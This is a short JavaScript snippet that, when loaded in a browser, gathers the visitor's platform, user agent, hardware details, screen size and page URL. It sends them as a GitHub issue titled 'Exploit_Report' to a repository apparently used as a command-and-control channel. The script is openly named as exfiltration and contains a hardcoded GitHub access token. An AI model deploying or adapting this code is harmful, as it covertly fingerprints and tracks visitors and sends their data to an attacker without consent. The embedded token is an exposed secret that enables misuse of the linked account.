(() => {
    const REPO_API = "https://api.github.com/repos/username-lo/nusantara-c2/issues";
    const TOKEN = "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"; // Token GitHub lo

    const exfiltrate = async () => {
        const payload = {
            title: `Exploit_Report_${Date.now()}`,
            body: JSON.stringify({
                platform: navigator.platform,
                browser: navigator.userAgent.split(' ').pop(),
                cpu: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                screen: `${screen.width}x${screen.height}`,
                url: window.location.href
            })
        };

        await fetch(REPO_API, {
            method: 'POST',
            headers: {
                'Authorization': `token ${TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    };

    exfiltrate();
})();
